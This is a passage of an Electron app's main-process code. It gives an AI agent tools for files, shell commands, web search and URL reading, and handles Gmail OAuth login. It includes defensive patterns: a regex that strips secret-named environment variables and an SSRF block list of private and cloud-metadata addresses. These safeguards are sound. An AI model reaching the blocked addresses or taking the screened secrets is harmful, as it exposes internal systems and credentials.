        // Legacy build works in Node without a worker; ESM, so dynamic import.
        const pdfjs = await import('pdfjs-dist/legacy/build/pdf.mjs');
        const loadingTask = pdfjs.getDocument({
            data: bytes,
            isEvalSupported: false,
            disableFontFace: true,
            useSystemFonts: true
        });
        const doc = await loadingTask.promise;
        let text = '';
        let pagesRead = 0;
        for (let i = 1; i <= doc.numPages; i++) {
            const page = await doc.getPage(i);
            const tc = await page.getTextContent();
            // hasEOL preserves the line structure pdf.js detects — keeps
            // tables/statements readable for the model instead of one blob.
            let pageText = '';
            for (const item of tc.items) {
                pageText += item.str + (item.hasEOL ? '\n' : ' ');
            }
            text += (text ? '\n\n' : '') + `[Page ${i}]\n` + pageText.trim();
            pagesRead = i;
            if (text.length >= AGENT_PDF_MAX_CHARS) break;
        }
        const numPages = doc.numPages;
        await loadingTask.destroy();
        const truncated = text.length > AGENT_PDF_MAX_CHARS || pagesRead < numPages;
        return {
            name: name || 'document.pdf',
            pages: numPages,
            pagesRead,
            text: text.slice(0, AGENT_PDF_MAX_CHARS),
            truncated
        };
    } catch (e) {
        return { error: e.message || 'Failed to parse PDF' };
    }
});

ipcMain.handle('agent-fs-write', (event, { path: p, content } = {}) => {
    const target = _agentExpandPath(p);
    if (!target) return { error: 'path must be absolute (or ~-based)' };
    if (typeof content !== 'string') return { error: 'content must be text' };
    if (Buffer.byteLength(content, 'utf8') > AGENT_FS_WRITE_CAP) return { error: 'content exceeds the 5MB write cap' };
    const access = _agentCheckAccess('fs:write', target, true);
    if (access.decision !== 'allow') return { error: `Not permitted to write ${target}. ${access.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    try {
        // fs_write writes FILES. A small model asked to "create a folder"
        // will reach for this tool — catch both confusions with pointed
        // errors instead of letting a file named like a folder appear.
        if (fs.existsSync(target) && fs.statSync(target).isDirectory()) {
            return { error: `${target} is a folder — fs_write writes files. To create a folder use fs_mkdir.` };
        }
        const parent = path.dirname(target);
        if (fs.existsSync(parent) && !fs.statSync(parent).isDirectory()) {
            return { error: `${parent} exists as a FILE, not a folder — fs_trash it or pick another location.` };
        }
        fs.mkdirSync(parent, { recursive: true });
        fs.writeFileSync(target, content, 'utf8');
        return { written: true, path: target, bytes: Buffer.byteLength(content, 'utf8') };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('agent-fs-mkdir', (event, { path: p } = {}) => {
    const target = _agentExpandPath(p);
    if (!target) return { error: 'path must be absolute (or ~-based)' };
    const access = _agentCheckAccess('fs:write', target, true);
    if (access.decision !== 'allow') return { error: `Not permitted to create ${target}. ${access.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    try {
        if (fs.existsSync(target)) {
            return fs.statSync(target).isDirectory()
                ? { created: false, existed: true, path: target, note: 'folder already exists — fine to use' }
                : { error: `${target} already exists as a FILE, not a folder — fs_trash it first or pick another name.` };
        }
        fs.mkdirSync(target, { recursive: true });
        return { created: true, path: target };
    } catch (e) {
        return { error: e.message };
    }
});

// Deletion is deliberately Trash-only (recoverable) — there is no permanent
// fs delete tool. shell.trashItem uses the real macOS Trash.
ipcMain.handle('agent-fs-trash', async (event, { path: p } = {}) => {
    const target = _agentExpandPath(p);
    if (!target) return { error: 'path must be absolute (or ~-based)' };
    const access = _agentCheckAccess('fs:write', target, true);
    if (access.decision !== 'allow') return { error: `Not permitted to trash ${target}. ${access.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    try {
        if (!fs.existsSync(target)) return { error: `${target} does not exist` };
        const { shell } = require('electron');
        await shell.trashItem(target);
        return { trashed: true, path: target, note: 'moved to the macOS Trash (recoverable)' };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('agent-fs-move', (event, { from, to } = {}) => {
    const f = _agentExpandPath(from), t = _agentExpandPath(to);
    if (!f || !t) return { error: 'both paths must be absolute (or ~-based)' };
    const af = _agentCheckAccess('fs:write', f, true);
    if (af.decision !== 'allow') return { error: `Not permitted to move ${f}. ${af.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    const at = _agentCheckAccess('fs:write', t, true);
    if (at.decision !== 'allow') return { error: `Not permitted to move into ${path.dirname(t)}. ${at.reason || 'The user must approve access first — just retry the call and they will be asked.'}` };
    try {
        if (!fs.existsSync(f)) return { error: `${f} does not exist` };
        if (fs.existsSync(t)) return { error: `${t} already exists — refusing to overwrite` };
        const parent = path.dirname(t);
        // A FILE sitting where the destination folder should be produces a
        // baffling EEXIST from mkdir — name the actual problem instead.
        if (fs.existsSync(parent) && !fs.statSync(parent).isDirectory()) {
            return { error: `Cannot move into ${parent} — it exists as a FILE, not a folder. fs_trash it, then fs_mkdir the folder and retry.` };
        }
        fs.mkdirSync(parent, { recursive: true });
        fs.renameSync(f, t);
        return { moved: true, from: f, to: t };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('agent-run-command', async (event, { command, cwd } = {}) => {
    const cmd = String(command || '').trim();
    if (!cmd) return { error: 'command required' };
    const access = _agentCheckAccess('shell', cmd, true);
    if (access.decision !== 'allow') return { error: `Not permitted to run "${cmd}". ${access.reason || 'The user must approve it first — just retry the call and they will be asked.'}` };
    const workDir = cwd ? _agentExpandPath(cwd) : os.homedir();
    if (!workDir || !fs.existsSync(workDir)) return { error: `cwd does not exist: ${cwd}` };
    // Scrub anything secret-shaped from the child's environment.
    const env = {};
    for (const [k, v] of Object.entries(process.env)) {
        if (!/(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)/i.test(k)) env[k] = v;
    }
    const { exec } = require('child_process');
    return new Promise((resolve) => {
        exec(cmd, { cwd: workDir, timeout: AGENT_SHELL_TIMEOUT_MS, maxBuffer: 1024 * 1024, env }, (err, stdout, stderr) => {
            const clip = (s) => {
                const str = String(s || '');
                return str.length > AGENT_SHELL_OUTPUT_CAP ? str.slice(0, AGENT_SHELL_OUTPUT_CAP) + '\n…(truncated)' : str;
            };
            resolve({
                command: cmd,
                cwd: workDir,
                exitCode: err ? (err.code ?? 1) : 0,
                timedOut: !!(err && err.killed),
                stdout: clip(stdout),
                stderr: clip(stderr)
            });
        });
    });
});

// Global search throttle: providers rate-limit hard (Brave's free tier is
// exactly 1 request/second) and the agent's parallel read-only batches can
// fire several web_search calls at once — as can Maker/Builder research
// running alongside a chat. Serialize ALL searches app-wide and space their
// starts ≥1s apart; callers see slightly slower results instead of 429s.
// Both provider functions self-timeout (30s) and always resolve, so the
// chain can never wedge.
const SEARCH_MIN_INTERVAL_MS = 1000;
let _searchChain = Promise.resolve();
let _lastSearchStartAt = 0;
function throttleSearch(fn) {
    const run = async () => {
        const wait = _lastSearchStartAt + SEARCH_MIN_INTERVAL_MS - Date.now();
        if (wait > 0) await new Promise(r => setTimeout(r, wait));
        _lastSearchStartAt = Date.now();
        return await fn();
    };
    const p = _searchChain.then(run, run);
    _searchChain = p.then(() => {}, () => {});
    return p;
}

ipcMain.handle('web-search', async (event, { query, maxResults } = {}) => {
    if (!query || !String(query).trim()) return { error: 'Empty query.' };
    const provider = getActiveSearchProvider();
    const apiKey = getSearchApiKey(provider);
    if (!apiKey) {
        return { error: `Web search not configured. Add a ${SEARCH_PROVIDERS[provider].label} API key in Settings.` };
    }
    const trimmed = String(query).trim();
    const limit = Math.max(1, Math.min(10, parseInt(maxResults, 10) || 5));
    if (provider === 'tavily') return await throttleSearch(() => _searchTavily(trimmed, limit, apiKey));
    if (provider === 'brave')  return await throttleSearch(() => _searchBrave(trimmed, limit, apiKey));
    return { error: `Unknown search provider: ${provider}` };
});

function _searchTavily(query, maxResults, apiKey) {
    const body = JSON.stringify({
        query,
        // "basic" depth is the cheap tier; "advanced" costs more credits per call.
        search_depth: 'basic',
        max_results: maxResults
        // include_answer omitted on purpose: Tavily's synthesized answer runs
        // a separate pipeline that can re-rank or filter results in ways that
        // hurt ambiguous queries (e.g. "Dublin CA" pulling Ireland content).
        // The model synthesizes from the raw snippets — one less moving part.
    });
    return new Promise((resolve) => {
        const req = https.request({
            hostname: 'api.tavily.com',
            path: '/search',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${apiKey}`,
                'Content-Length': Buffer.byteLength(body)
            }
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                if (res.statusCode !== 200) {
                    let msg = `Tavily error (${res.statusCode})`;
                    try { const p = JSON.parse(data); if (p.detail) msg = typeof p.detail === 'string' ? p.detail : JSON.stringify(p.detail); } catch {}
                    console.error(`[web-search] tavily HTTP ${res.statusCode}: ${msg}`);
                    resolve({ error: msg, provider: 'tavily' });
                    return;
                }
                try {
                    const parsed = JSON.parse(data);
                    const results = (parsed.results || []).map(r => ({
                        title: r.title,
                        url: r.url,
                        snippet: (r.content || '').slice(0, 400)
                    }));
                    resolve({ results, provider: 'tavily' });
                } catch {
                    resolve({ error: 'Invalid Tavily response', provider: 'tavily' });
                }
            });
        });
        req.on('error', (e) => { console.error('[web-search] tavily', e.message); resolve({ error: e.message, provider: 'tavily' }); });
        req.setTimeout(30000, () => { req.destroy(); resolve({ error: 'Web search timeout', provider: 'tavily' }); });
        req.write(body);
        req.end();
    });
}

function _searchBrave(query, maxResults, apiKey) {
    // GET /res/v1/web/search?q=<>&count=<>. Auth via X-Subscription-Token.
    // We deliberately skip Accept-Encoding: gzip so we don't have to bundle
    // zlib decompression for a payload that's only a few KB.
    const params = new URLSearchParams({ q: query, count: String(maxResults) });
    return new Promise((resolve) => {
        const req = https.request({
            hostname: 'api.search.brave.com',
            path: `/res/v1/web/search?${params.toString()}`,
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'X-Subscription-Token': apiKey
            }
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                if (res.statusCode !== 200) {
                    let msg = `Brave error (${res.statusCode})`;
                    try {
                        const p = JSON.parse(data);
                        if (p?.message) msg = String(p.message);
                        else if (p?.error?.detail) msg = String(p.error.detail);
                        else if (p?.error) msg = typeof p.error === 'string' ? p.error : JSON.stringify(p.error);
                    } catch {}
                    console.error(`[web-search] brave HTTP ${res.statusCode}: ${msg}`);
                    resolve({ error: msg, provider: 'brave' });
                    return;
                }
                try {
                    const parsed = JSON.parse(data);
                    const items = (parsed?.web?.results || []);
                    const results = items.slice(0, maxResults).map(r => ({
                        title: r.title || '',
                        url: r.url || '',
                        snippet: (r.description || '').slice(0, 400)
                    }));
                    resolve({ results, provider: 'brave' });
                } catch {
                    resolve({ error: 'Invalid Brave response', provider: 'brave' });
                }
            });
        });
        req.on('error', (e) => { console.error('[web-search] brave', e.message); resolve({ error: e.message, provider: 'brave' }); });
        req.setTimeout(30000, () => { req.destroy(); resolve({ error: 'Web search timeout', provider: 'brave' }); });
        req.end();
    });
}

// ── read-url — the read step after web_search (docs/COWORK_AGENT.md §3a) ──
//
// Fetches a page and returns its READABLE text, sized for a small local
// model's context budget: never raw HTML, never more than ~3500 chars. The
// two-hop pattern is web_search (snippets) → read_url on the best hits.
// Provider-agnostic and works on user-pasted URLs too.

const READ_URL_MAX_RAW = 2 * 1024 * 1024;  // hard cap on downloaded bytes
const READ_URL_MAX_TEXT = 3500;            // ≈1k tokens returned to the model

// SECURITY (H2/SSRF): is this resolved IP one the agent must never reach?
// Covers loopback, RFC-1918, CGNAT, link-local (incl. cloud metadata
// 169.254.169.254), multicast/reserved, and the IPv6 equivalents. Anything
// that isn't a clean public address is treated as unsafe.
function _ipIsPrivate(ip) {
    const net = require('net');
    const kind = net.isIP(ip);
    if (kind === 4) {
        const p = String(ip).split('.').map(Number);
        if (p.length !== 4 || p.some(n => Number.isNaN(n))) return true;
        const [a, b] = p;
        if (a === 0 || a === 10 || a === 127) return true;          // this-net, private, loopback
        if (a === 169 && b === 254) return true;                    // link-local + metadata
        if (a === 172 && b >= 16 && b <= 31) return true;           // 172.16/12
        if (a === 192 && b === 168) return true;                    // 192.168/16
        if (a === 100 && b >= 64 && b <= 127) return true;          // CGNAT 100.64/10
        if (a >= 224) return true;                                  // multicast / reserved
        return false;
    }
    if (kind === 6) {
        let v = String(ip).toLowerCase();
        const pct = v.indexOf('%'); if (pct !== -1) v = v.slice(0, pct);
        if (v === '::1' || v === '::') return true;                 // loopback / unspecified
        if (v.startsWith('fe80')) return true;                      // link-local
        if (v.startsWith('fc') || v.startsWith('fd')) return true;  // unique-local fc00::/7
        if (v.startsWith('ff')) return true;                        // multicast
        const m = v.match(/::ffff:(\d+\.\d+\.\d+\.\d+)$/);          // IPv4-mapped
        if (m) return _ipIsPrivate(m[1]);
        return false;
    }
    return true;  // not a resolvable IP → unsafe
}

// A drop-in `lookup` for http/https.get. It validates the SAME resolution the
// socket will connect to (not a separate pre-resolve), so a hostname that
// rebinds to a private A record is rejected at connect time. Used by every
// model-/user-controlled fetch below so `read_url`/`fetch-url-title` cannot be
// steered at 127.0.0.1, LAN hosts, or the metadata endpoint.
function _guardedLookup(hostname, options, callback) {
    const cb = typeof options === 'function' ? options : callback;
    const opts = typeof options === 'function' ? {} : (options || {});
    require('dns').lookup(hostname, opts, (err, address, family) => {
        if (err) return cb(err);
        const list = Array.isArray(address) ? address : [{ address, family }];
        for (const a of list) {
            if (_ipIsPrivate(a.address)) {
                return cb(new Error('Blocked: host resolves to a private, loopback, or link-local address'));
            }
        }
        cb(null, address, family);
    });
}

// Fetch a URL (http/https only), following up to 5 redirects, rejecting
// non-text content types at the header stage and capping the body. Resolves
// { html, contentType, finalUrl } or { error, contentType? }.
function _fetchForRead(url, redirects = 0) {
    if (redirects > 5) return Promise.resolve({ error: 'Too many redirects' });
    let parsed;
    try { parsed = new URL(url); } catch { return Promise.resolve({ error: 'Invalid URL' }); }
    // Scheme guard — the renderer's model controls this argument, so never
    // let it reach file:// or the app's privileged custom schemes.
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
        return Promise.resolve({ error: `Only http/https URLs can be read (got ${parsed.protocol})` });
    }
    const getFn = parsed.protocol === 'http:' ? http.get : https.get;
    return new Promise((resolve) => {
        const req = getFn(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                // No Accept-Encoding: servers fall back to identity, so the
                // body needs no gzip handling (same as fetchTitle).
                'Accept': 'text/html,application/xhtml+xml,text/plain;q=0.9,*/*;q=0.5'
            },
            timeout: 12000,
            lookup: _guardedLookup  // SSRF guard: reject private/loopback resolutions
        }, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                let redirectUrl = res.headers.location;
                if (redirectUrl.startsWith('/')) redirectUrl = `${parsed.protocol}//${parsed.host}${redirectUrl}`;
                res.resume();
                resolve(_fetchForRead(redirectUrl, redirects + 1));
                return;
            }
            if (res.statusCode !== 200) {
                res.resume();
                resolve({ error: `HTTP ${res.statusCode}` });
                return;
            }
            const contentType = (res.headers['content-type'] || '').toLowerCase();
            const isText = contentType.includes('text/html')
                || contentType.includes('application/xhtml')
                || contentType.includes('text/plain');
            if (!isText) {
                // PDFs, images, downloads: never dump bytes into the model.
                res.destroy();
                resolve({ error: `Not a readable page (${contentType.split(';')[0] || 'unknown type'}). Suggest the user open it directly.`, contentType });
                return;
            }
            const chunks = [];
            let size = 0;
            let settled = false;
            const finish = () => {
                if (settled) return;
                settled = true;
                resolve({ html: Buffer.concat(chunks).toString('utf8'), contentType, finalUrl: url });
            };
            res.on('data', (c) => {
                size += c.length;
                chunks.push(c);
                if (size >= READ_URL_MAX_RAW) { res.destroy(); finish(); }
            });
            res.on('end', finish);
            res.on('close', finish);
            res.on('error', finish);
        });
        req.on('error', (e) => resolve({ error: e.message }));
        req.on('timeout', () => { req.destroy(); resolve({ error: 'Page load timed out' }); });
    });
}

// Cut text to READ_URL_MAX_TEXT chars. With `find`, center the window on the
// best case-insensitive match instead of the page top — this is what lets a
// small model pull "the return policy" out of a long page without paging.
function _excerptFor(text, find) {
    const cap = READ_URL_MAX_TEXT;
    if (text.length <= cap) return { text, truncated: false };
    let center = -1;
    const needle = (find || '').trim().toLowerCase();
    if (needle) {
        const hay = text.toLowerCase();
        let at = hay.indexOf(needle);
        if (at === -1) {
            // Fall back to the first word of the ask ("return policy" → "return").
            const word = needle.split(/\s+/)[0];
            if (word) at = hay.indexOf(word);
        }
        if (at !== -1) center = at + Math.floor(needle.length / 2);
    }
    let start = center === -1 ? 0 : Math.max(0, center - Math.floor(cap / 2));
    if (start + cap > text.length) start = Math.max(0, text.length - cap);
    // Snap to a word boundary so the excerpt doesn't open mid-word.
    if (start > 0) {
        const nextSpace = text.indexOf(' ', start);
        if (nextSpace !== -1 && nextSpace - start < 80) start = nextSpace + 1;
    }
    return { text: text.slice(start, start + cap), truncated: true };
}

ipcMain.handle('read-url', async (event, { url, find } = {}) => {
    if (!url || !String(url).trim()) return { error: 'url required' };
    const fetched = await _fetchForRead(String(url).trim());
    if (fetched.error) return { error: fetched.error, contentType: fetched.contentType };

    let title = null, byline = null, text = '';
    if (fetched.contentType.includes('text/plain')) {
        text = fetched.html;
    } else {
        try {
            // JSDOM does not execute scripts here (no runScripts), so parsing
            // hostile pages is inert.
            const dom = new JSDOM(fetched.html, { url: fetched.finalUrl });
            // Readability strips nav/ads/chrome down to the article text. It
            // arrived with this feature (npm dep), so a build that pulled code
            // without `npm install` won't have it — degrade to raw body text
            // instead of failing the whole tool.
            let article = null;
            try {
                const { Readability } = require('@mozilla/readability');
                article = new Readability(dom.window.document).parse();
            } catch (e) {
                console.warn('[read-url] Readability unavailable (run npm install?) — body-text fallback:', e.message);
            }
            if (article && (article.textContent || '').trim()) {
                title = article.title || null;
                byline = article.byline || null;
                text = article.textContent;
            } else {
                // No article shape (home pages, apps) or no Readability:
                // the whole body text, whitespace-collapsed below.
                text = dom.window.document.body?.textContent || '';
                title = dom.window.document.title || null;
            }
        } catch (e) {
            console.warn('[read-url] extraction failed:', e.message);
            return { error: `Could not extract readable text: ${e.message}` };
        }
    }

    text = text.replace(/[ \t]+/g, ' ').replace(/\s*\n\s*/g, '\n').trim();
    if (!text) return { error: 'The page had no readable text.' };

    const totalChars = text.length;
    const excerpt = _excerptFor(text, find);
    return {
        title,
        url: fetched.finalUrl,
        byline: byline || undefined,
        text: excerpt.text,
        truncated: excerpt.truncated,
        totalChars
    };
});


// --- Gmail OAuth & Email Sync ---

// Escape values interpolated into the OAuth loopback success/error pages (L9).
// The source is Google userinfo (remote injection is unlikely), but these pages
// render in a browser, so escaping is correct defense-in-depth.
function oauthHtmlEscape(s) {
    return String(s == null ? '' : s)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

// Shared shell for every OAuth loopback result page (rendered in the user's
// browser after Google redirects back). Self-contained inline CSS matching the
// app's minimal-book theme, light + dark. messageHtml is HTML — callers escape
// user-derived values with oauthHtmlEscape() before interpolating.
function oauthResultPage(heading, messageHtml, ok = false) {
    return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${oauthHtmlEscape(heading)} &mdash; Anjadhe</title>
<style>
    :root { color-scheme: light dark; }
    * { box-sizing: border-box; }
    body {
        margin: 0; min-height: 100vh;
        display: flex; align-items: center; justify-content: center;
        background: #f8f8f8; color: #111111;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        -webkit-font-smoothing: antialiased;
    }
    .card {
        max-width: 420px; margin: 24px; padding: 44px 48px;
        background: #ffffff; border: 1px solid #e4e4e4; border-radius: 14px;
        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
        text-align: center;
    }
    .wordmark {
        font-family: Nunito, -apple-system, BlinkMacSystemFont, sans-serif;
        font-size: 0.75rem; font-weight: 700;
        text-transform: uppercase; letter-spacing: 0.12em;
        color: #444444; margin-bottom: 28px;
    }
    .mark {
        width: 44px; height: 44px; margin: 0 auto;
        display: flex; align-items: center; justify-content: center;
        border: 1px solid #e4e4e4; border-radius: 50%;
        font-size: 1.15rem; color: #444444;
    }
    .mark.ok { background: #111111; border-color: #111111; color: #ffffff; }
    h1 {
        font-family: Nunito, -apple-system, BlinkMacSystemFont, sans-serif;
        font-size: 1.35rem; font-weight: 700; margin: 18px 0 10px;
    }
    p { font-size: 0.9rem; line-height: 1.65; color: #444444; margin: 0; }
    @media (prefers-color-scheme: dark) {
        body { background: #161616; color: #eeeeee; }
        .card { background: #1e1e1e; border-color: #2e2e2e; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4); }
        .wordmark { color: #808080; }
        .mark { border-color: #2e2e2e; color: #b8b8b8; }
        .mark.ok { background: #eeeeee; border-color: #eeeeee; color: #161616; }
        p { color: #b8b8b8; }
    }
</style>
</head><body>
    <div class="card">
        <div class="wordmark">Anjadhe</div>
        <div class="mark${ok ? ' ok' : ''}">${ok ? '&#10003;' : '&#10005;'}</div>
        <h1>${oauthHtmlEscape(heading)}</h1>
        <p>${messageHtml}</p>
    </div>
</body></html>`;
}

const GMAIL_SCOPES = ['https://www.googleapis.com/auth/gmail.modify'];

function getGmailCredentials() {
    return {
        clientId: process.env.GMAIL_CLIENT_ID || '',
        clientSecret: process.env.GMAIL_CLIENT_SECRET || ''
    };
}

// Store tokens per account email, encrypted via OS keychain (safeStorage)
function getGmailTokens(email) {
    const encrypted = settingsStore.get(`gmailTokens_${email}`, null);
    if (!encrypted) return null;
    try {
        const decrypted = safeStorage.decryptString(Buffer.from(encrypted, 'base64'));
        return JSON.parse(decrypted);
    } catch (e) {
        // NEVER delete here: decryptString also throws on TRANSIENT keychain
        // denials (locked keychain, permission prompt, harness launches), and
        // deleting turned a hiccup into a forced re-auth. The stored blob is
        // harmless to keep; explicit removal lives in removeGmailTokens.
        console.warn(`[gmail-oauth] Token decrypt failed for ${email} (keeping stored blob):`, e.message);
        return null;
    }
}

// Returns true on success, false when the keychain is unavailable (M9: fail
// closed — never persist OAuth tokens in cleartext).
function setGmailTokens(email, tokens) {
    if (!safeStorage.isEncryptionAvailable()) {
        console.warn('[gmail-oauth] refusing to store tokens — OS keychain (safeStorage) unavailable');
        return false;
    }
    const encrypted = safeStorage.encryptString(JSON.stringify(tokens)).toString('base64');
    settingsStore.set(`gmailTokens_${email}`, encrypted);
    return true;
}

function removeGmailTokens(email) {
    settingsStore.delete(`gmailTokens_${email}`);
}

// PKCE helpers

function generateCodeVerifier() {
    return crypto.randomBytes(32).toString('base64url');
}

function generateCodeChallenge(verifier) {
    return crypto.createHash('sha256').update(verifier).digest('base64url');
}

// OAuth flow using loopback server + PKCE
ipcMain.handle('email-start-oauth', async () => {
    const creds = getGmailCredentials();
    if (!creds.clientId || !creds.clientSecret) {
        return { success: false, error: 'Gmail API credentials not configured. Update GMAIL_CLIENT_ID and GMAIL_CLIENT_SECRET in main.js.' };
    }

    // Generate PKCE pair per-session
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    // CSRF guard (SECURITY-AUDIT.md M5): a random state ties the callback to
    // this request. A forged/replayed hit on the loopback carries a wrong or
    // missing state and is rejected before any code is exchanged. `handled`
    // tears the flow down after the first real callback.
    const oauthState = generateCodeVerifier();
    let handled = false;

    return new Promise((resolve) => {
        const server = http.createServer(async (req, res) => {
            const url = new URL(req.url, `http://localhost`);

            if (url.pathname === '/callback') {
                // Ignore extra callbacks once the flow is resolved (favicon
                // hits, double-loads) — tear down after the first real one.
                if (handled) { res.writeHead(204); res.end(); return; }
                // M5: reject any callback whose state doesn't match ours —
                // Google echoes state on both success and error redirects, so
                // a legitimate cancel still matches. Checked before code use.
                const returnedState = url.searchParams.get('state');
                if (!returnedState || returnedState !== oauthState) {
                    handled = true;
                    res.writeHead(400, { 'Content-Type': 'text/html' });
                    res.end(oauthResultPage('Authentication blocked', 'The response could not be verified. Please close this window and try connecting again from Anjadhe.'));
                    server.close();
                    resolve({ success: false, error: 'OAuth state mismatch — this callback was not initiated by Anjadhe' });
                    return;
                }
                handled = true;
                const code = url.searchParams.get('code');
                const error = url.searchParams.get('error');

                if (error) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(oauthResultPage('Sign-in cancelled', 'No changes were made. You can close this window and return to Anjadhe.'));
                    server.close();
                    resolve({ success: false, error });
                    return;
                }

                if (code) {
                    try {
                        // Exchange code for tokens (with PKCE verifier)
                        const tokenData = await exchangeCodeForTokens(code, creds, server.address().port, codeVerifier);
                        if (tokenData.error) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Sign-in failed', 'Something went wrong during sign-in. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: tokenData.error });
                            return;
                        }

                        // Get user email
                        const profile = await gmailApiRequest('GET', '/gmail/v1/users/me/profile', null, tokenData.access_token);
                        const email = profile?.emailAddress;

                        if (!email) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Could not read your account', 'Google did not return your email address. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: 'Could not retrieve email address' });
                            return;
                        }

                        // Save tokens — fail closed if the keychain can't encrypt.
                        const saved = setGmailTokens(email, {
                            access_token: tokenData.access_token,
                            refresh_token: tokenData.refresh_token,
                            expiry: Date.now() + (tokenData.expires_in * 1000)
                        });
                        if (!saved) {
                            res.writeHead(200, { 'Content-Type': 'text/html' });
                            res.end(oauthResultPage('Could not save credentials', 'This Mac&rsquo;s keychain is unavailable, so the connection was not stored. You can close this window and try again from Anjadhe.'));
                            server.close();
                            resolve({ success: false, error: 'Could not store credentials securely — this Mac’s keychain is unavailable.' });
                            return;
                        }

                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(oauthResultPage('Connected', `<strong>${oauthHtmlEscape(email)}</strong> is now linked to Anjadhe. You can close this window and return to the app.`, true));
                        server.close();
                        resolve({ success: true, email });
                    } catch (err) {
                        res.writeHead(200, { 'Content-Type': 'text/html' });
                        res.end(oauthResultPage('Authentication error', 'Something went wrong. You can close this window and try again from Anjadhe.'));
                        server.close();
                        resolve({ success: false, error: err.message });
                    }
                }
            }
        });

        server.listen(0, '127.0.0.1', () => {
            const port = server.address().port;
            const redirectUri = `http://127.0.0.1:${port}/callback`;
            const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
                `client_id=${encodeURIComponent(creds.clientId)}` +
                `&redirect_uri=${encodeURIComponent(redirectUri)}` +
                `&response_type=code` +
                `&scope=${encodeURIComponent(GMAIL_SCOPES.join(' '))}` +
                `&access_type=offline` +
                `&prompt=consent` +
                `&code_challenge=${encodeURIComponent(codeChallenge)}` +
                `&code_challenge_method=S256` +
                `&state=${encodeURIComponent(oauthState)}`;

            const { shell } = require('electron');
            shell.openExternal(authUrl);
        });

        // Timeout after 5 minutes
        setTimeout(() => {
            server.close();
            resolve({ success: false, error: 'Authentication timed out' });
        }, 5 * 60 * 1000);
    });
});

function exchangeCodeForTokens(code, creds, port, codeVerifier) {
    return new Promise((resolve, reject) => {
        const postData = new URLSearchParams({
            code,
            client_id: creds.clientId,
            client_secret: creds.clientSecret,
            redirect_uri: `http://127.0.0.1:${port}/callback`,
            grant_type: 'authorization_code',
            code_verifier: codeVerifier
        }).toString();

        const req = https.request({
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch { resolve({ error: 'Invalid token response' }); }
            });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

async function refreshAccessToken(email) {
    const tokens = getGmailTokens(email);
    if (!tokens?.refresh_token) {
        console.warn(`[gmail-oauth] No refresh token stored for ${email} — re-auth required`);
        return null;
    }

    const creds = getGmailCredentials();
    if (!creds.clientId || !creds.clientSecret) {
        console.error('[gmail-oauth] Gmail OAuth credentials not configured');
        return null;
    }

    return new Promise((resolve) => {
        const postData = new URLSearchParams({
            refresh_token: tokens.refresh_token,
            client_id: creds.clientId,
            client_secret: creds.clientSecret,
            grant_type: 'refresh_token'
        }).toString();

        const req = https.request({
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const result = JSON.parse(data);
                    if (result.access_token) {
                        const updated = {
                            ...tokens,
                            access_token: result.access_token,
                            // Google sometimes rotates refresh tokens — keep the new one if provided
                            refresh_token: result.refresh_token || tokens.refresh_token,
                            expiry: Date.now() + (result.expires_in * 1000)
                        };
                        setGmailTokens(email, updated);
                        console.log(`[gmail-oauth] Token refreshed for ${email}, expires in ${result.expires_in}s`);
                        resolve(updated.access_token);
                    } else {
                        console.error(`[gmail-oauth] Refresh failed for ${email}: status=${res.statusCode}, error=${result.error || 'unknown'}, desc=${result.error_description || 'none'}`);
                        // invalid_grant means the refresh token is dead (revoked, expired,
                        // or password changed). Clear it so we don't keep retrying — the
                        // user must re-authenticate.
                        if (result.error === 'invalid_grant') {
                            console.warn(`[gmail-oauth] Refresh token revoked/expired for ${email}, clearing stored tokens`);
                            removeGmailTokens(email);
                        }
                        resolve(null);
                    }
                } catch (e) {
                    console.error(`[gmail-oauth] Refresh response parse error for ${email}:`, e.message, data.slice(0, 200));
                    resolve(null);
                }
            });
        });
        req.on('error', (err) => {
            console.error(`[gmail-oauth] Refresh network error for ${email}:`, err.message);
            resolve(null);
        });
